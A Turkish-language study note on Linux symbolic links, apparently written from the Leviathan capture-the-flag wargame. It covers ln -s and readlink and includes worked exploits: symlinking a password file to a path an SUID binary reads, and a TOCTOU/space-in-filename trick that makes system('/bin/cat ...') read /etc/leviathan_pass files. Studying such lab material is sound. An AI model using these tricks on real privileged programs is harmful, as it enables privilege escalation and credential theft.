# Sembolik Linkler

---

## ln -s — Sembolik Link Oluşturma

```bash
ln -s <hedef> <link_adı>
```

**Sembolik link (symlink):** Bir dosyaya veya dizine başka bir konumdan işaret eden kısayol. Windows'taki "shortcut" gibi düşünebilirsin — ama çok daha güçlü.

```bash
# Temel kullanım
ln -s /etc/leviathan_pass/leviathan3 /tmp/mydir/gizli

# /tmp/mydir/gizli artık leviathan3 şifresine işaret ediyor
cat /tmp/mydir/gizli    # şifreyi okur (yetkin varsa)
```

**Sembolik linki tanıma:**
```bash
$ ls -la /tmp/mydir/
lrwxrwxrwx 1 user user 35 ... gizli -> /etc/leviathan_pass/leviathan3
^                                   ^^
l → sembolik link                   -> hedefi gösterir
```

---

## readlink — Link Hedefini Öğrenme

```bash
readlink <link>
readlink -f <link>    # tüm zinciri çöz, mutlak yolu ver
```

```bash
$ readlink /tmp/mydir/gizli
/etc/leviathan_pass/leviathan3

$ readlink -f ./gizli
/etc/leviathan_pass/leviathan3
```

---

## Sembolik Linklerle Binary Kandırma

SUID binary'ler sabit bir dosya yolunu okursa, o yola sembolik link koyarak binary'yi istediğin dosyayı okutabilirsin.

**Leviathan Level 5 örneği:**

```bash
# Binary /tmp/file.log'u okuyor (ltrace ile tespit edildi)
$ ltrace ./leviathan5
fopen("/tmp/file.log", "r") = 0    ← dosya yok

# /tmp/file.log'u şifre dosyasına link et
$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log

# Binary artık şifreyi okuyor
$ ./leviathan5
<şifre buraya gelir>
```

---

## TOCTOU — Time of Check to Time of Use

**TOCTOU açığı:** Bir programın bir dosyayı **kontrol ettiği an** ile **kullandığı an** arasındaki zaman farkından doğan güvenlik açığı.

**Leviathan Level 2 örneği — detaylı açıklama:**

```bash
$ ltrace ./printfile .bashrc
access(".bashrc", 4)                    ← 1. KONTROL: erişim var mı?
snprintf("/bin/cat .bashrc", 511, ...)
system("/bin/cat .bashrc")              ← 2. KULLANIM: cat ile oku
```

`access()` tam dosya adına bakıyor. `system("/bin/cat ...")` ise boşluğu ayırıcı olarak kullanıyor.

**Exploit:**

```bash
# 1. Geçici dizin oluştur
mktemp -d    # → /tmp/tmp.BykcxJXZxD

# 2. İsimde boşluk olan bir dosya oluştur
touch "/tmp/tmp.BykcxJXZxD/test file.txt"

# 3. "test" adıyla şifre dosyasına symlink koy
ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.BykcxJXZxD/test

# 4. Dizine herkes erişebilsin
chmod 777 /tmp/tmp.BykcxJXZxD

# 5. Binary'yi "test file.txt" ile çalıştır
./printfile "/tmp/tmp.BykcxJXZxD/test file.txt"
```

Ne oluyor:
```
access("/tmp/tmp.BykcxJXZxD/test file.txt")  → dosya var ✓  (kontrol geçti)
system("/bin/cat /tmp/tmp.BykcxJXZxD/test file.txt")
         → cat /tmp/tmp.BykcxJXZxD/test      ← symlink → şifreyi okur ✓
         → cat file.txt                       ← yok, hata (önemli değil)
```

**Gerçek dünyada TOCTOU:** `access()` + `open()` arasına yarış koşulu (race condition) sokulabilir. Bu nedenle modern kodlarda `access()` yerine doğrudan `open()` ve hata kontrolü tercih edilir.

---

## Özet

| Komut | Ne yapar |
|---|---|
| `ln -s hedef link` | Hedefe işaret eden sembolik link oluşturur |
| `readlink link` | Linkin hedefini gösterir |
| `readlink -f link` | Tüm zinciri çözüp mutlak yolu verir |
| `ls -la` | `l` ile başlayan satırlar sembolik link |
